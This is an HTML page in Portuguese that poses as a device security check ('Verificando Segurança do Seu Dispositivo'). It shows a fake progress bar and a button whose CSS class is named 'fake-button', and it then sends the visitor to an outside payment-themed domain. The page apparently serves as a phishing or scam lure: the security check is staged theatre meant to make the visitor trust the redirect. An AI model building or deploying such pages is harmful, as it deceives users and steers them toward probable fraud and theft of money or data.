     <!DOCTYPE html>
     <html>
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Verificação de Segurança</title>
         <style>
             body { margin:0; font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background:#f5f7fa; }
             .container { text-align:center; padding:200px 20px; }
             .bar { width:0%; background:#4CAF50; height:10px; border-radius:5px; transition:width 0.5s ease-in-out; margin:50px auto; max-width:400px; }
             h1 { color:#2c3e50; }
             .fake-button { background:#3498db; color:white; border:none; padding:12px 30px; border-radius:5px; cursor:pointer; margin-top:20px; }
         </style>
     </head>
     <body>
         <div class="container">
             <h1>Verificando Segurança do Seu Dispositivo</h1>
             <div class="bar" id="bar"></div>
             <p>Processo: <span id="status">Inicializando...</span></p>
             <button class="fake-button" onclick="skip()">Revalidar Dados Instantaneamente</button>
         </div>
         <script>
             let progress = 0;
             const interval = setInterval(() => {
                 progress += 5;
                 document.getElementById("bar").style.width = `${progress}%`;
                 document.getElementById("status").innerText = `${progress}% concluído`;
                 if (progress >= 100) {
                     clearInterval(interval);
                     setTimeout(() => {
                         window.location.href = "https://pagamentocerto.space/saldott/";
                     }, 1000);
                 }
             }, 200);

             function skip() {
                 clearInterval(interval);
                 window.location.href = "https://pagamentocerto.space/saldott/"; // Force redirect manual
             }
         </script>
     </body>
     </html>
